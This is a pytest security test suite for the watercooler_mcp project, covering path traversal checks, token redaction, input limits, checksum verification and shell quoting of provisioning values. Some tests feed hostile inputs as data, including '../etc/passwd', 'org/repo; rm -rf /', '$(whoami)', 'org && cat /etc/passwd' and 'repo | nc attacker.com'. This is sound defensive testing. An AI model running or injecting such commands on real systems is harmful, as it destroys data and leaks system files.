"""Security-focused test suite.

Tests for security-critical functionality including:
- Path traversal prevention
- Token sanitization
- Input validation
- CORS configuration
- Request size limits
"""

from __future__ import annotations

import os
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock


class TestPathTraversalPrevention:
    """Tests for path traversal attack prevention."""

    def test_validate_topic_rejects_path_traversal(self):
        """Topic validation rejects path traversal attempts."""
        from watercooler_mcp.hosted_ops import _validate_topic

        # Test various path traversal patterns
        with pytest.raises(ValueError, match="path traversal"):
            _validate_topic("../etc/passwd")

        with pytest.raises(ValueError, match="path traversal"):
            _validate_topic("..\\windows\\system32")

        with pytest.raises(ValueError, match="path traversal"):
            _validate_topic("foo/../bar")

        with pytest.raises(ValueError, match="path traversal"):
            _validate_topic("foo/bar")

        with pytest.raises(ValueError, match="path traversal"):
            _validate_topic("foo\\bar")

    def test_validate_topic_rejects_hidden_files(self):
        """Topic validation rejects hidden file patterns."""
        from watercooler_mcp.hosted_ops import _validate_topic

        with pytest.raises(ValueError, match="cannot start"):
            _validate_topic(".hidden")

        with pytest.raises(ValueError, match="cannot start"):
            _validate_topic(".env")

    def test_validate_topic_rejects_empty(self):
        """Topic validation rejects empty strings."""
        from watercooler_mcp.hosted_ops import _validate_topic

        with pytest.raises(ValueError, match="cannot be empty"):
            _validate_topic("")

    def test_validate_topic_allows_valid_topics(self):
        """Topic validation allows legitimate topics."""
        from watercooler_mcp.hosted_ops import _validate_topic

        # These should not raise
        _validate_topic("my-topic")
        _validate_topic("feature-auth-refactor")
        _validate_topic("v2-api-design")
        _validate_topic("sprint-42-planning")


class TestTokenSanitization:
    """Tests for token sanitization in error messages."""

    def test_slack_client_sanitizes_errors(self):
        """Slack client sanitizes tokens from error messages."""
        from watercooler_mcp.slack.client import SlackClient

        client = SlackClient(bot_token="xoxb-secret-token-12345")

        # Test error sanitization
        error_msg = "API error: invalid token xoxb-secret-token-12345 provided"
        sanitized = client._sanitize_error(error_msg)

        assert "xoxb-secret-token-12345" not in sanitized
        assert "[REDACTED]" in sanitized

    def test_sanitization_handles_no_token(self):
        """Sanitization works when no token is set."""
        from watercooler_mcp.slack.client import SlackClient

        # Client without token
        with patch.dict(os.environ, {}, clear=True):
            client = SlackClient.__new__(SlackClient)
            client._token = None

            # Should not crash
            error_msg = "Some error message"
            result = client._sanitize_error(error_msg)
            assert result == error_msg


class TestInputValidation:
    """Tests for input validation across modules."""

    def test_topic_max_length(self):
        """Topic names have reasonable length limits."""
        from watercooler_mcp.hosted_ops import _validate_topic

        # Very long topic should be rejected or handled gracefully
        long_topic = "a" * 1000

        # Should either raise or handle gracefully
        # Current implementation may not have this limit, but it's a good practice
        try:
            _validate_topic(long_topic)
        except ValueError:
            pass  # Expected if limit is implemented

    def test_slack_message_truncation(self):
        """Slack messages are truncated to prevent API errors."""
        # The SlackClient.post_entry_reply truncates body internally
        # Verify the truncation logic is present in the code
        from watercooler_mcp.slack import client
        import inspect

        source = inspect.getsource(client.SlackClient.post_entry_reply)
        # Verify truncation logic exists
        assert "max_body" in source
        assert "2500" in source  # The truncation limit
        assert "..." in source  # Adds ellipsis


class TestTempFilePermissions:
    """Tests for secure temp file handling."""

    def test_atomic_write_json_sets_permissions(self, tmp_path):
        """Atomic JSON write sets readable permissions."""
        from watercooler.baseline_graph.storage import atomic_write_json
        import stat

        test_file = tmp_path / "test.json"
        atomic_write_json(test_file, {"key": "value"})

        # Check file exists and is readable
        assert test_file.exists()
        mode = test_file.stat().st_mode

        # Should be readable by user and group (0644)
        assert mode & stat.S_IRUSR  # User read
        assert mode & stat.S_IWUSR  # User write
        assert mode & stat.S_IRGRP  # Group read
        assert mode & stat.S_IROTH  # Other read

    def test_atomic_write_jsonl_sets_permissions(self, tmp_path):
        """Atomic JSONL write sets readable permissions."""
        from watercooler.baseline_graph.storage import atomic_write_jsonl
        import stat

        test_file = tmp_path / "test.jsonl"
        atomic_write_jsonl(test_file, [{"key": "value"}])

        assert test_file.exists()
        mode = test_file.stat().st_mode

        # Should be readable (0644)
        assert mode & stat.S_IRUSR
        assert mode & stat.S_IRGRP
        assert mode & stat.S_IROTH


class TestCacheEviction:
    """Tests for cache size limits and eviction."""

    def test_memory_cache_has_max_size(self):
        """MemoryCache has a configured max size."""
        from watercooler_mcp.cache import MemoryCache

        cache = MemoryCache()
        assert cache._max_entries == 10000  # Default

    def test_memory_cache_evicts_on_overflow(self):
        """MemoryCache evicts oldest entries when full."""
        from watercooler_mcp.cache import MemoryCache

        cache = MemoryCache(max_entries=3)

        # Fill cache
        cache.set("key1", "value1")
        cache.set("key2", "value2")
        cache.set("key3", "value3")

        # Add one more (should evict oldest)
        cache.set("key4", "value4")

        # key1 should be evicted (oldest)
        assert cache.get("key1") is None
        assert cache.get("key2") is not None
        assert cache.get("key3") is not None
        assert cache.get("key4") is not None

    def test_memory_cache_lru_order(self):
        """MemoryCache uses LRU order for eviction."""
        from watercooler_mcp.cache import MemoryCache

        cache = MemoryCache(max_entries=3)

        cache.set("key1", "value1")
        cache.set("key2", "value2")
        cache.set("key3", "value3")

        # Access key1 (moves to end of LRU)
        cache.get("key1")

        # Add new key (should evict key2, not key1)
        cache.set("key4", "value4")

        assert cache.get("key1") is not None  # Was accessed, not evicted
        assert cache.get("key2") is None  # Was oldest unused, evicted
        assert cache.get("key3") is not None
        assert cache.get("key4") is not None


class TestTokenCacheTTL:
    """Tests for token cache TTL configuration."""

    def test_github_token_cache_default_ttl(self):
        """GitHub token cache has 5 minute default TTL."""
        from watercooler_mcp.auth import TOKEN_CACHE_TTL

        assert TOKEN_CACHE_TTL == 300  # 5 minutes

    def test_slack_token_cache_default_ttl(self):
        """Slack token cache has 5 minute default TTL."""
        from watercooler_mcp.slack.token_service import SLACK_TOKEN_CACHE_TTL

        assert SLACK_TOKEN_CACHE_TTL == 300  # 5 minutes

    def test_token_expiration_check(self):
        """Cached tokens are checked for expiration."""
        from watercooler_mcp.auth import CachedToken
        import time

        # Create a token cached 10 minutes ago
        token_info = MagicMock()
        cached = CachedToken(token_info=token_info)
        cached.cached_at = time.time() - 600  # 10 minutes ago

        # Should be expired with 5 minute TTL
        assert cached.is_expired()


class TestManifestLocking:
    """Tests for manifest update locking."""

    def test_manifest_uses_advisory_lock(self, tmp_path):
        """Manifest updates use advisory locking."""
        from watercooler.baseline_graph import storage

        graph_dir = tmp_path / "graph" / "baseline"
        graph_dir.mkdir(parents=True)

        # First update should work
        storage.update_manifest(graph_dir, "test-topic", "entry-1")

        # Lock file should be created
        lock_path = graph_dir / ".manifest.lock"
        # Lock file may or may not persist after release

        # Manifest should be updated
        manifest = storage.load_manifest(graph_dir)
        assert manifest.get("last_topic") == "test-topic"


class TestDualWriteErrorHandling:
    """Tests for dual-write error handling."""

    def test_dual_write_failure_logged_not_raised(self, tmp_path, caplog):
        """Dual-write failures are logged but don't fail the primary write."""
        from watercooler.baseline_graph import writer, storage
        from watercooler.baseline_graph.writer import EntryData

        threads_dir = tmp_path / "threads"
        threads_dir.mkdir()

        # Create entry data
        entry_data = EntryData(
            entry_id="01ABC123",
            thread_topic="test-topic",
            index=0,
            agent="TestAgent",
            role="implementer",
            entry_type="Note",
            title="Test Entry",
            body="Test body content",
        )

        # First, initialize the thread in graph
        writer.init_thread_in_graph(threads_dir, "test-topic")

        # The upsert should succeed even if monolithic write fails
        result = writer.upsert_entry_node(threads_dir, entry_data)

        # Primary write should succeed
        assert result is True

        # Entry should exist in per-thread format
        graph_dir = storage.get_graph_dir(threads_dir)
        entries = storage.load_thread_entries_dict(graph_dir, "test-topic")
        assert f"entry:{entry_data.entry_id}" in entries


# =============================================================================
# New Security Tests (PR #106 Review Fixes)
# =============================================================================


class TestValidateSafePath:
    """Tests for validate_safe_path() function."""

    def test_valid_absolute_path(self):
        """Test that valid absolute paths are accepted."""
        from watercooler_mcp.validation import validate_safe_path

        error, path = validate_safe_path("/tmp/test")
        assert error is None
        assert path is not None
        assert path == Path("/tmp/test").resolve()

    def test_valid_relative_path(self):
        """Test that relative paths are resolved correctly."""
        from watercooler_mcp.validation import validate_safe_path

        error, path = validate_safe_path(".")
        assert error is None
        assert path is not None
        assert path == Path.cwd()

    def test_null_byte_rejected(self):
        """Test that paths with null bytes are rejected."""
        from watercooler_mcp.validation import validate_safe_path

        error, path = validate_safe_path("/tmp/test\x00malicious")
        assert error is not None
        assert "null bytes" in error.lower()
        assert path is None

    def test_suspicious_pattern_rejected(self):
        """Test that suspicious patterns like ... are rejected."""
        from watercooler_mcp.validation import validate_safe_path

        error, path = validate_safe_path("/tmp/.../etc/passwd")
        assert error is not None
        assert "suspicious" in error.lower()
        assert path is None

    def test_traversal_resolved(self):
        """Test that .. sequences are resolved (not rejected)."""
        from watercooler_mcp.validation import validate_safe_path

        # This should resolve to /etc/passwd, which is valid
        error, path = validate_safe_path("/tmp/../etc/passwd")
        assert error is None
        assert path is not None
        # Path should be resolved (no .. in result)
        assert ".." not in str(path)

    def test_allowed_bases_enforced(self, tmp_path):
        """Test that allowed_bases constraint is enforced."""
        from watercooler_mcp.validation import validate_safe_path

        allowed = [tmp_path]

        # Path within allowed base should work
        subdir = tmp_path / "subdir"
        subdir.mkdir()
        error, path = validate_safe_path(str(subdir), allowed_bases=allowed)
        assert error is None
        assert path == subdir

        # Path outside allowed base should fail
        error, path = validate_safe_path("/etc/passwd", allowed_bases=allowed)
        assert error is not None
        assert "escapes allowed" in error.lower()
        assert path is None

    def test_must_exist_enforced(self, tmp_path):
        """Test that must_exist=True requires path to exist."""
        from watercooler_mcp.validation import validate_safe_path

        # Existing path should work
        existing = tmp_path / "existing.txt"
        existing.write_text("test")
        error, path = validate_safe_path(str(existing), must_exist=True)
        assert error is None
        assert path == existing

        # Non-existing path should fail
        error, path = validate_safe_path(str(tmp_path / "nonexistent"), must_exist=True)
        assert error is not None
        assert "does not exist" in error.lower()
        assert path is None


class TestValidateLimit:
    """Tests for _validate_limit() function."""

    def test_valid_limit(self):
        """Test that valid limits pass through."""
        from watercooler_mcp.tools.graph import _validate_limit

        assert _validate_limit(10) == 10
        assert _validate_limit(50) == 50
        assert _validate_limit(1) == 1

    def test_exceeds_max(self):
        """Test that limits exceeding max are clamped."""
        from watercooler_mcp.tools.graph import _validate_limit

        assert _validate_limit(200) == 100
        assert _validate_limit(1000) == 100

    def test_negative_returns_default(self):
        """Test that negative values return default."""
        from watercooler_mcp.tools.graph import _validate_limit

        assert _validate_limit(-5) == 10
        assert _validate_limit(-1) == 10

    def test_zero_returns_default(self):
        """Test that zero returns default."""
        from watercooler_mcp.tools.graph import _validate_limit

        assert _validate_limit(0) == 10

    def test_custom_default(self):
        """Test custom default value."""
        from watercooler_mcp.tools.graph import _validate_limit

        assert _validate_limit(-1, default=5) == 5

    def test_custom_max(self):
        """Test custom max value."""
        from watercooler_mcp.tools.graph import _validate_limit

        assert _validate_limit(100, max_value=50) == 50


class TestValidateThreshold:
    """Tests for _validate_threshold() function."""

    def test_valid_threshold(self):
        """Test that valid thresholds pass through."""
        from watercooler_mcp.tools.graph import _validate_threshold

        assert _validate_threshold(0.5) == 0.5
        assert _validate_threshold(0.0) == 0.0
        assert _validate_threshold(1.0) == 1.0

    def test_exceeds_max(self):
        """Test that thresholds > 1.0 are clamped."""
        from watercooler_mcp.tools.graph import _validate_threshold

        assert _validate_threshold(1.5) == 1.0
        assert _validate_threshold(2.0) == 1.0

    def test_below_min(self):
        """Test that thresholds < 0.0 are clamped."""
        from watercooler_mcp.tools.graph import _validate_threshold

        assert _validate_threshold(-0.5) == 0.0
        assert _validate_threshold(-1.0) == 0.0


class TestChecksumVerification:
    """Tests for checksum verification functions."""

    def test_compute_sha256(self, tmp_path):
        """Test SHA256 computation."""
        import hashlib
        from watercooler_mcp.startup import _compute_sha256

        # Create a test file with known content
        test_file = tmp_path / "test.bin"
        test_content = b"Hello, World!"
        test_file.write_bytes(test_content)

        # Compute expected hash
        expected = hashlib.sha256(test_content).hexdigest()

        # Verify our function matches
        actual = _compute_sha256(test_file)
        assert actual == expected

    def test_verify_checksum_match(self, tmp_path):
        """Test checksum verification when checksums match."""
        import hashlib
        from watercooler_mcp.startup import _verify_checksum

        # Create test file
        test_file = tmp_path / "test.bin"
        test_content = b"Test content"
        test_file.write_bytes(test_content)
        expected = hashlib.sha256(test_content).hexdigest()

        # Should pass with matching checksum
        result = _verify_checksum(test_file, expected, "test-release", "test-asset")
        assert result is True
        assert test_file.exists()  # File not deleted

    def test_verify_checksum_mismatch(self, tmp_path):
        """Test checksum verification when checksums don't match."""
        from watercooler_mcp.startup import _verify_checksum

        # Create test file
        test_file = tmp_path / "test.bin"
        test_file.write_bytes(b"Test content")
        wrong_checksum = "0" * 64

        # Should fail and delete the file
        result = _verify_checksum(test_file, wrong_checksum, "test-release", "test-asset")
        assert result is False
        assert not test_file.exists()  # File should be deleted

    def test_verify_checksum_unknown_warn_mode(self, tmp_path, monkeypatch):
        """Test that unknown checksum in warn mode logs warning but passes."""
        from watercooler_mcp.startup import _verify_checksum

        monkeypatch.setenv("WATERCOOLER_LLAMA_SERVER_VERIFY", "warn")

        test_file = tmp_path / "test.bin"
        test_file.write_bytes(b"Test content")

        # Unknown checksum (None) in warn mode should pass
        result = _verify_checksum(test_file, None, "test-release", "test-asset")
        assert result is True
        assert test_file.exists()

    def test_verify_checksum_unknown_strict_mode(self, tmp_path, monkeypatch):
        """Test that unknown checksum in strict mode raises error."""
        from watercooler_mcp.startup import _verify_checksum

        monkeypatch.setenv("WATERCOOLER_LLAMA_SERVER_VERIFY", "strict")

        test_file = tmp_path / "test.bin"
        test_file.write_bytes(b"Test content")

        # Unknown checksum (None) in strict mode should raise
        with pytest.raises(RuntimeError) as exc_info:
            _verify_checksum(test_file, None, "test-release", "test-asset")

        assert "No known checksum" in str(exc_info.value)

    def test_verify_checksum_skip_mode(self, tmp_path, monkeypatch):
        """Test that skip mode bypasses verification entirely."""
        from watercooler_mcp.startup import _verify_checksum

        monkeypatch.setenv("WATERCOOLER_LLAMA_SERVER_VERIFY", "skip")

        test_file = tmp_path / "test.bin"
        test_file.write_bytes(b"Test content")

        # Should pass regardless of checksum
        result = _verify_checksum(test_file, "wrong-checksum", "test-release", "test-asset")
        assert result is True

    def test_get_expected_checksum_user_override(self, monkeypatch):
        """Test that user-provided checksum via env var takes precedence."""
        from watercooler_mcp.startup import _get_expected_checksum

        user_checksum = "abc123def456"
        monkeypatch.setenv("WATERCOOLER_LLAMA_SERVER_SHA256", user_checksum)

        result = _get_expected_checksum("any-release", "any-asset")
        assert result == user_checksum.lower()


class TestDockerPathVerification:
    """Tests for Docker path verification."""

    def test_get_docker_path_from_which(self, monkeypatch):
        """Test finding Docker via shutil.which."""
        from watercooler_mcp.startup import _get_docker_path

        # Mock shutil.which to return a path
        monkeypatch.setattr("shutil.which", lambda x: "/usr/bin/docker" if x == "docker" else None)

        path = _get_docker_path()
        assert path is not None
        assert str(path) == "/usr/bin/docker"

    def test_get_docker_path_override(self, tmp_path, monkeypatch):
        """Test WATERCOOLER_DOCKER_PATH override."""
        from watercooler_mcp.startup import _get_docker_path

        # Create a fake docker binary
        fake_docker = tmp_path / "fake-docker"
        fake_docker.write_text("#!/bin/sh\necho docker")
        fake_docker.chmod(0o755)

        monkeypatch.setenv("WATERCOOLER_DOCKER_PATH", str(fake_docker))

        path = _get_docker_path()
        assert path is not None
        assert path == fake_docker.resolve()

    def test_get_docker_path_invalid_override(self, monkeypatch):
        """Test that invalid override falls back to None."""
        from watercooler_mcp.startup import _get_docker_path

        monkeypatch.setenv("WATERCOOLER_DOCKER_PATH", "/nonexistent/docker")
        monkeypatch.setattr("shutil.which", lambda x: None)

        path = _get_docker_path()
        assert path is None

    def test_get_docker_path_not_found(self, monkeypatch):
        """Test when Docker is not found."""
        from watercooler_mcp.startup import _get_docker_path

        monkeypatch.delenv("WATERCOOLER_DOCKER_PATH", raising=False)
        monkeypatch.setattr("shutil.which", lambda x: None)

        path = _get_docker_path()
        assert path is None


class TestProcessCleanup:
    """Tests for spawned process cleanup."""

    def test_register_and_cleanup(self, monkeypatch):
        """Test PID registration and cleanup."""
        from watercooler_mcp import startup

        # Clear any existing PIDs
        with startup._pids_lock:
            startup._spawned_pids.clear()

        # Register some PIDs
        startup._register_spawned_pid(1234)
        startup._register_spawned_pid(5678)

        assert 1234 in startup._spawned_pids
        assert 5678 in startup._spawned_pids

        # Mock os.kill to track calls
        killed = []
        def mock_kill(pid, sig):
            killed.append(pid)
            raise ProcessLookupError()  # Simulate process already exited

        monkeypatch.setattr("os.kill", mock_kill)

        # Run cleanup
        startup._cleanup_spawned_processes()

        # All PIDs should have been attempted
        assert 1234 in killed
        assert 5678 in killed

        # PID list should be cleared
        assert len(startup._spawned_pids) == 0


class TestThreadsProvisioningShellSafety:
    """Tests for shell injection prevention in threads repo provisioning."""

    def test_as_shell_safe_dict_quotes_values(self):
        """Test that ProvisioningContext.as_shell_safe_dict quotes all values."""
        from watercooler_mcp.provisioning import ProvisioningContext

        ctx = ProvisioningContext(
            slug="org/my-repo",
            repo_url="https://github.com/org/my-repo.git",
            code_repo="my-code-repo",
            namespace="org",
            repo="my-repo",
            org="org",
        )

        safe_dict = ctx.as_shell_safe_dict()

        # All values should be quoted (shlex.quote adds quotes)
        for key, value in safe_dict.items():
            # shlex.quote returns the value with quoting if needed
            assert value, f"Value for {key} should not be empty"

    def test_as_shell_safe_dict_escapes_shell_metacharacters(self):
        """Test that shell metacharacters are properly escaped."""
        from watercooler_mcp.provisioning import ProvisioningContext
        import shlex

        # Create context with malicious values
        ctx = ProvisioningContext(
            slug="org/repo; rm -rf /",
            repo_url="https://github.com/$(whoami)/repo.git",
            code_repo="repo`id`",
            namespace="org && cat /etc/passwd",
            repo="repo | nc attacker.com",
            org="org",
        )

        safe_dict = ctx.as_shell_safe_dict()

        # Verify each value is properly quoted
        for key, value in safe_dict.items():
            # The value should be shell-safe (re-parsing should give original)
            # If properly quoted, shlex.split should return the quoted string
            assert "; rm -rf /" not in value or "'" in value or '"' in value
            assert "$(whoami)" not in value or "'" in value
            assert "`id`" not in value or "'" in value or "\\" in value

    def test_provision_via_cli_uses_shell_safe_values(self, monkeypatch, tmp_path):
        """Test that provision_threads_repo uses shell-safe values."""
        from watercooler_mcp.provisioning import provision_threads_repo, PROVISION_CMD_ENV
        import subprocess

        captured_command = []

        def mock_run(command, **kwargs):
            captured_command.append(command)
            result = subprocess.CompletedProcess(command, 0, stdout="", stderr="")
            return result

        monkeypatch.setattr(subprocess, "run", mock_run)

        # Use a template that uses the slug
        monkeypatch.setenv(PROVISION_CMD_ENV, "echo {slug}")
        # Clear GITHUB_TOKEN so we use CLI path
        monkeypatch.delenv("GITHUB_TOKEN", raising=False)
        monkeypatch.delenv("GH_TOKEN", raising=False)

        # Attempt provisioning with malicious slug
        malicious_slug = "org/repo; cat /etc/passwd"

        try:
            provision_threads_repo(
                repo_url="git@github.com:org/repo.git",  # SSH URL to avoid API path
                slug=malicious_slug,
                code_repo="code-repo",
            )
        except Exception:
            pass  # Command may fail, we just want to check what was passed

        # The captured command should have the slug properly quoted
        if captured_command:
            cmd = captured_command[0]
            # The semicolon should be quoted, not treated as command separator
            assert "; cat" not in cmd or "'" in cmd
            # The command should contain the slug in quoted form
            assert "org/repo" in cmd

    def test_provision_context_as_dict_vs_shell_safe(self):
        """Test difference between as_dict and as_shell_safe_dict."""
        from watercooler_mcp.provisioning import ProvisioningContext

        ctx = ProvisioningContext(
            slug="org/repo",
            repo_url="https://github.com/org/repo.git",
            code_repo="code-repo",
            namespace="org",
            repo="repo",
            org="org",
        )

        regular_dict = ctx.as_dict()
        safe_dict = ctx.as_shell_safe_dict()

        # Regular dict has raw values
        assert regular_dict["slug"] == "org/repo"

        # Safe dict has quoted values (shlex.quote on a safe value may or may not add quotes)
        # but for values with special chars, it definitely adds quotes
        import shlex
        assert safe_dict["slug"] == shlex.quote("org/repo")


class TestAutoProvisionConfig:
    """Tests for auto-provisioning configuration."""

    def test_is_auto_provision_enabled_default(self, monkeypatch):
        """Test that auto-provision defaults to True."""
        from watercooler_mcp.startup import _is_auto_provision_enabled

        # Clear env vars
        monkeypatch.delenv("WATERCOOLER_AUTO_PROVISION_MODELS", raising=False)
        monkeypatch.delenv("WATERCOOLER_AUTO_PROVISION_LLAMA_SERVER", raising=False)

        # Default should be True
        assert _is_auto_provision_enabled("models") is True
        assert _is_auto_provision_enabled("llama_server") is True

    def test_is_auto_provision_enabled_env_override_true(self, monkeypatch):
        """Test enabling auto-provision via env var."""
        from watercooler_mcp.startup import _is_auto_provision_enabled

        monkeypatch.setenv("WATERCOOLER_AUTO_PROVISION_MODELS", "true")
        assert _is_auto_provision_enabled("models") is True

        monkeypatch.setenv("WATERCOOLER_AUTO_PROVISION_MODELS", "1")
        assert _is_auto_provision_enabled("models") is True

        monkeypatch.setenv("WATERCOOLER_AUTO_PROVISION_MODELS", "yes")
        assert _is_auto_provision_enabled("models") is True

    def test_is_auto_provision_enabled_env_override_false(self, monkeypatch):
        """Test disabling auto-provision via env var."""
        from watercooler_mcp.startup import _is_auto_provision_enabled

        monkeypatch.setenv("WATERCOOLER_AUTO_PROVISION_LLAMA_SERVER", "false")
        assert _is_auto_provision_enabled("llama_server") is False

        monkeypatch.setenv("WATERCOOLER_AUTO_PROVISION_LLAMA_SERVER", "0")
        assert _is_auto_provision_enabled("llama_server") is False

        monkeypatch.setenv("WATERCOOLER_AUTO_PROVISION_LLAMA_SERVER", "no")
        assert _is_auto_provision_enabled("llama_server") is False

    def test_model_auto_provision_check(self, monkeypatch):
        """Test model auto-provision check function."""
        from watercooler.models import is_model_auto_provision_enabled

        # Test env var override - enabled
        monkeypatch.setenv("WATERCOOLER_AUTO_PROVISION_MODELS", "true")
        assert is_model_auto_provision_enabled() is True

        # Test env var override - disabled
        monkeypatch.setenv("WATERCOOLER_AUTO_PROVISION_MODELS", "false")
        assert is_model_auto_provision_enabled() is False

        # Test default (env var unset)
        monkeypatch.delenv("WATERCOOLER_AUTO_PROVISION_MODELS", raising=False)
        assert is_model_auto_provision_enabled() is True  # Default

    def test_service_provision_config_defaults(self):
        """Test ServiceProvisionConfig default values."""
        from watercooler.config_schema import ServiceProvisionConfig

        config = ServiceProvisionConfig()
        assert config.models is True
        assert config.llama_server is True

    def test_service_provision_config_custom(self):
        """Test ServiceProvisionConfig with custom values."""
        from watercooler.config_schema import ServiceProvisionConfig

        config = ServiceProvisionConfig(models=False, llama_server=False)
        assert config.models is False
        assert config.llama_server is False
